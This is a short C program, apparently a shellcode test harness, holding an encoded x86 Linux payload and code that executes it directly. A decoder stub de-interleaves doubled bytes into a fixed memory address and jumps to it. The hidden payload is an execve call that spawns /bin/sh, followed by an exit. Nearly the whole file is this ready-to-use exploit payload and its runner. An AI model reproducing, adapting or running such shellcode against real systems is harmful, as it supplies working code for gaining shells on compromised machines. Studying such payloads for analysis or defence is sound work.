
#include <stdio.h>
#include <string.h>
unsigned char shellcode[]=
"\xeb\x20\x5e\x8d\x3d\xec\x90\x04\x08\x31\xc0\x31\xdb\x31\xc9\xb0\x02\x3c\x19\x74\x40\x8a\x1c\x0e\x88\x1f\x83\xc1\x02\x47\xfe\xc0\xeb\xef\xe8\xdb\xff\xff\xff\x31\x31\xc0\xc0\x50\x50\x68\x68\x2f\x2f\x2f\x2f\x73\x73\x68\x68\x68\x68\x2f\x2f\x62\x62\x69\x69\x6e\x6e\x89\x89\xe3\xe3\x50\x50\x53\x53\x89\x89\xe1\xe1\xb0\xb0\x0b\x0b\xcd\xcd\x80\x80\x31\xc0\x50\x83\xec\x31\xc0\x50\x83\xec\x04\x68\xec\x90\x04\x08\xff\x24\x24\x83\xc4\x08\x31\xc0\x40\xcd\x80";
int main()
{
    printf("Shellcode size: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
